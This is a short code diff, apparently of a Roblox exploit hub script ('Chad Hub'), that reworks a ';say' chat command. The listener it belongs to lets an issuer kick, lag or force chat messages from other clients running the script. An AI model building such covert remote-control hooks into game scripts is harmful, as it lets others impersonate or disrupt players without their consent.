@@ -423,13 +423,22 @@ TextChatService.MessageReceived:Connect(function(msg)
         if cmd == "kick" then
             localPlayer:Kick("\n\nVocê Foi Expulso Por Chad Hub Admin\n")
 
-        -- [[ COMANDO: SAY (Sincronizado) ]]
+
         elseif cmd == "say" then
-            local sayMessage = text:match("^;say%s+[^%s]+%s+(.+)$")
-            if victim == localPlayer and sayMessage then
-                local channel = game:GetService("TextChatService").TextChannels.RBXGeneral
-                channel:SendAsync(sayMessage)
-            end
+    -- Pega tudo que vem depois do ;say nome_do_alvo
+    local sayMessage = text:match("^;say%s+[^%s]+%s+(.+)$")
+    
+    -- Se o alvo for você e houver uma mensagem...
+    if victim == localPlayer and sayMessage then
+        -- Tenta achar o canal de chat de forma segura
+        local chatService = game:GetService("TextChatService")
+        local channel = chatService.TextChannels:FindFirstChild("RBXGeneral") or chatService.TextChannels:GetChildren()[1]
+        
+        if channel then
+            channel:SendAsync(sayMessage)
+        end
+    end
+        
 
         -- [[ COMANDO: LAG ]]
         elseif cmd == "lag" then
@@ -6407,6 +6416,7 @@ task.spawn(function()
         RE:WaitForChild("1RPNam1eColo1r", 9e9):FireServer("PickingRPBioColor", Color3.fromRGB(255, 19, 3))
     end)
 end)
+
 
 
 
